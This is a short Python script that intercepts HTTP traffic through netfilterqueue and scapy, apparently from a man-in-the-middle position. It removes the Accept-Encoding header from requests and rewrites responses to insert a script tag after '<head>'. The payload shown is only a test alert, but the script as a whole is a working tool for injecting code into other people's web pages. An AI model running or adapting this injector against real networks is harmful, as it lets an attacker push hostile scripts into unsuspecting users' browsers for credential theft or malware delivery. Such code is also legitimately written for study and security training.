import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return (packet)


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] HTTP Request")
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode())
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] HTTP Response")
                header = bytes("<head>", encoding='utf-8')
                java_code = bytes("<script>alert('Testing');</script></head>", encoding='utf-8')
                modified_load = scapy_packet[scapy.Raw].load.replace(header, java_code)
                new_packet = set_load(scapy_packet, modified_load.decode())
                packet.set_payload(bytes(new_packet))

        except:
            pass
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(123, process_packet)
queue.run()
